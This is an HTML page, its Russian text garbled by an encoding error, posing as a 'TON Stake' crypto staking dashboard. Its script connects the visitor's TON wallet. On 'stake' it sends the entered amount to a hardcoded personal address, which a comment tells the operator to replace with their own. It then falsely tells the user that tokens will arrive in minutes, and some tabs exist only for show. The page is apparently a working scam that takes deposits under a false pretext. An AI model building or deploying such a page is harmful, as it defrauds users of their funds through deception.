<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>TON Stake ‚Äî –ö–∞–±–∏–Ω–µ—Ç</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: system-ui, sans-serif; background: #f8fafc; }
    .card { background: white; border-radius: 24px; padding: 24px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #e2e8f0; }
    .btn { padding: 12px 24px; border-radius: 40px; font-weight: 600; cursor: pointer; border: none; }
    .btn-primary { background: #0098EA; color: white; }
    .btn-primary:hover { background: #0077be; }
    .btn-disabled { background: #cbd5e1; color: #94a3b8; cursor: not-allowed; }
    .input-field { width: 100%; padding: 12px; border: 1px solid #cbd5e1; border-radius: 12px; margin: 8px 0 16px; }
    .sidebar { width: 280px; background: white; border-right: 1px solid #e2e8f0; padding: 24px; }
    .sidebar-item { padding: 12px; border-radius: 12px; margin-bottom: 8px; cursor: pointer; }
    .sidebar-item:hover { background: #f1f5f9; }
    .sidebar-item.active { background: #dbeafe; color: #0098EA; font-weight: 600; }
    .status-badge { background: #e2e8f0; padding: 4px 8px; border-radius: 20px; font-size: 12px; }
  </style>
</head>
<body>
<div class="min-h-screen flex">
  <!-- –°–ê–ô–î–ë–ê–† -->
  <div class="sidebar hidden md:block">
    <div class="flex items-center gap-3 mb-8">
      <div class="w-10 h-10 bg-blue-600 rounded-xl"></div>
      <div>
        <div class="font-bold text-lg">TON Stake</div>
        <div class="text-xs text-gray-500">–ö–∞–±–∏–Ω–µ—Ç</div>
      </div>
    </div>
    
    <!-- –ö–ù–û–ü–ö–ê –ü–û–î–ö–õ–Æ–ß–ï–ù–ò–Ø –í –°–ê–ô–î–ë–ê–†–ï -->
    <button id="connectBtnSide" class="btn btn-primary w-full mb-6 flex items-center justify-center gap-2">
      <span>üîó</span> <span id="connectBtnTextSide">–ü–æ–¥–∫–ª—é—á–∏—Ç—å –∫–æ—à–µ–ª—ë–∫</span>
    </button>
    
    <!-- –ú–ï–ù–Æ -->
    <div class="sidebar-item active" data-tab="staking">ü™ô –°—Ç–µ–π–∫–∏–Ω–≥</div>
    <div class="sidebar-item" data-tab="history">üìú –ò—Å—Ç–æ—Ä–∏—è</div>
    <div class="sidebar-item" data-tab="support">üí¨ –ü–æ–¥–¥–µ—Ä–∂–∫–∞</div>
    
    <!-- –°–¢–ê–¢–£–° -->
    <div class="mt-auto pt-8 text-xs text-gray-500">
      <div>Network: TON</div>
      <div id="addrSide">Wallet: ‚Äî</div>
    </div>
  </div>

  <!-- –û–°–ù–û–í–ù–ê–Ø –ß–ê–°–¢–¨ -->
  <div class="flex-1">
    <!-- –í–ï–†–•–ù–Ø–Ø –ü–ê–ù–ï–õ–¨ -->
    <div class="h-16 bg-white border-b flex items-center justify-between px-6">
      <div class="font-bold text-lg flex items-center gap-2">
        <span id="topTitleIcon">ü™ô</span>
        <span id="topTitle">–°—Ç–µ–π–∫–∏–Ω–≥</span>
      </div>
      
      <!-- –ö–ù–û–ü–ö–ê –ü–û–î–ö–õ–Æ–ß–ï–ù–ò–Ø –í–í–ï–†–•–£ -->
      <button id="connectBtnTop" class="btn btn-primary flex items-center gap-2">
        <span>üîó</span> <span id="connectBtnTextTop">–ü–æ–¥–∫–ª—é—á–∏—Ç—å –∫–æ—à–µ–ª—ë–∫</span>
      </button>
    </div>

    <!-- –ö–û–ù–¢–ï–ù–¢ -->
    <div class="p-6">
      <!-- –í–ö–õ–ê–î–ö–ê –°–¢–ï–ô–ö–ò–ù–ì -->
      <div id="tab-staking" class="tab-block">
        <div class="card">
          <h2 class="text-2xl font-bold mb-6">–í–Ω–µ—Å—Ç–∏ –≤ —Å—Ç–µ–π–∫–∏–Ω–≥</h2>
          
          <!-- –ü–û–õ–ï –î–õ–Ø –°–£–ú–ú–´ -->
          <label class="block text-sm font-medium mb-2">–°—É–º–º–∞ (TON)</label>
          <input 
            type="number" 
            id="amountInput" 
            min="10" 
            step="10" 
            value="100"
            class="input-field"
          >
          <p class="text-xs text-gray-500 mb-4">–ú–∏–Ω–∏–º—É–º 10 TON</p>
          
          <!-- –ö–ù–û–ü–ö–ê –°–¢–ï–ô–ö–ò–ù–ì–ê -->
          <button 
            id="stakeBtn" 
            class="btn btn-primary w-full text-lg py-4"
          >
            –í —Å—Ç–µ–π–∫–∏–Ω–≥ ‚Üí
          </button>
          
          <!-- –°–¢–ê–¢–£–° –¢–†–ê–ù–ó–ê–ö–¶–ò–ò -->
          <div id="txStatus" class="mt-4 text-sm text-gray-600"></div>
        </div>
      </div>

      <!-- –û–°–¢–ê–õ–¨–ù–´–ï –í–ö–õ–ê–î–ö–ò (–ü–£–°–¢–´–ï) -->
      <div id="tab-history" class="tab-block hidden">–ò—Å—Ç–æ—Ä–∏—è</div>
      <div id="tab-support" class="tab-block hidden">–ü–æ–¥–¥–µ—Ä–∂–∫–∞</div>
    </div>
  </div>
</div>

<!-- ========== –°–ö–†–ò–ü–¢ (–í–°–Å –í –û–î–ù–û–ú) ========== -->
<script type="module">
  // ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è –°–Æ–î–ê –í–°–¢–ê–í–¨ –°–í–û–ô –ê–î–†–ï–° –ö–û–®–ï–õ–¨–ö–ê ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è
  const RECEIVER_ADDRESS = "UQAq0NKzs0XtMyzbOn6ieHvAMudRq5ILy8oT_TOMLD8JEutW";
  
  // –ò–º–ø–æ—Ä—Ç—ã
  import { TonConnectUI } from 'https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js';

  // –≠–ª–µ–º–µ–Ω—Ç—ã —Å—Ç—Ä–∞–Ω–∏—Ü—ã
  const elements = {
    connectBtnSide: document.getElementById('connectBtnSide'),
    connectBtnTop: document.getElementById('connectBtnTop'),
    connectTextSide: document.getElementById('connectBtnTextSide'),
    connectTextTop: document.getElementById('connectBtnTextTop'),
    addrSide: document.getElementById('addrSide'),
    amountInput: document.getElementById('amountInput'),
    stakeBtn: document.getElementById('stakeBtn'),
    txStatus: document.getElementById('txStatus')
  };

  // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è TonConnect
  const tonConnectUI = new TonConnectUI({
    manifestUrl: 'https://kap352837598.github.io/tonconnect-manifest.json',
    buttonRootId: 'connectBtnTop' // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –∫–Ω–æ–ø–∫–∞
  });

  // –û—Ç—Å–ª–µ–∂–∏–≤–∞–µ–º —Å—Ç–∞—Ç—É—Å –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
  tonConnectUI.onStatusChange(wallet => {
    const connected = !!wallet;
    const btnText = connected ? '‚úÖ –ö–æ—à–µ–ª—ë–∫ –ø–æ–¥–∫–ª—é—á—ë–Ω' : 'üîó –ü–æ–¥–∫–ª—é—á–∏—Ç—å –∫–æ—à–µ–ª—ë–∫';
    
    if (elements.connectTextSide) elements.connectTextSide.textContent = btnText;
    if (elements.connectTextTop) elements.connectTextTop.textContent = btnText;
    
    if (elements.addrSide) {
      elements.addrSide.textContent = 'Wallet: ' + (wallet?.account?.address?.slice(0,8) + '...' || '‚Äî');
    }
  });

  // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ —Å—Ç–µ–π–∫–∏–Ω–≥–∞
  elements.stakeBtn.addEventListener('click', async () => {
    if (!tonConnectUI.connected) {
      alert('–°–Ω–∞—á–∞–ª–∞ –ø–æ–¥–∫–ª—é—á–∏ –∫–æ—à–µ–ª—ë–∫');
      return;
    }

    const amount = parseFloat(elements.amountInput.value);
    if (amount < 10) {
      alert('–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ 10 TON');
      return;
    }

    elements.txStatus.textContent = '‚è≥ –û—Ç–ø—Ä–∞–≤–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏...';
    
    try {
      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 600,
        messages: [{
          address: RECEIVER_ADDRESS,
          amount: (amount * 1e9).toString(),
          payload: 'stake'
        }]
      };

      const result = await tonConnectUI.sendTransaction(transaction);
      elements.txStatus.textContent = '‚úÖ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞! –¢–æ–∫–µ–Ω—ã –ø–æ—Å—Ç—É–ø—è—Ç –≤ —Ç–µ—á–µ–Ω–∏–µ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –º–∏–Ω—É—Ç.';
      console.log('–†–µ–∑—É–ª—å—Ç–∞—Ç:', result);
      
    } catch (error) {
      elements.txStatus.textContent = '‚ùå –û—à–∏–±–∫–∞: ' + (error.message || '–¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–∫–ª–æ–Ω–µ–Ω–∞');
      console.error(error);
    }
  });

  // –ü–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ –≤–∫–ª–∞–¥–æ–∫ (–ø—Ä–æ—Å—Ç–æ –¥–ª—è –∫—Ä–∞—Å–æ—Ç—ã)
  document.querySelectorAll('.sidebar-item').forEach(item => {
    item.addEventListener('click', () => {
      document.querySelectorAll('.sidebar-item').forEach(i => i.classList.remove('active'));
      item.classList.add('active');
      
      document.querySelectorAll('.tab-block').forEach(tab => tab.classList.add('hidden'));
      document.getElementById(`tab-${item.dataset.tab}`)?.classList.remove('hidden');
      
      document.getElementById('topTitle').textContent = item.textContent.trim();
      document.getElementById('topTitleIcon').textContent = item.textContent.trim()[0];
    });
  });
</script>

</body>
</html>
